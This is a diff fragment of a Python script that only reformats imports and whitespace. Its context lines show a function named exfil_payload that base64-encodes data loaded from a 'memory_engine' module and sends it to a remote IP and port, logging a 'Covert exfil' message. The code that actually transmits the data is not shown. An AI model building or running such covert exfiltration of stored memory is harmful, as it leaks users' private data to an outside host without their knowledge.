@@ -1,5 +1,8 @@
-import base64, socket
+import base64
+import socket
+
 from memory_engine import load_memory
+
 
 def exfil_payload(ip, port, data):
     b64_data = base64.b64encode(data.encode()).decode()
@@ -13,6 +16,7 @@ def exfil_payload(ip, port, data):
         print(f"[+] Covert exfil to {ip}:{port}")
     except Exception as e:
         print(f"[!] Failed exfil to {ip}:{port} - {e}")
+
 
 if __name__ == "__main__":
     mem = load_memory()
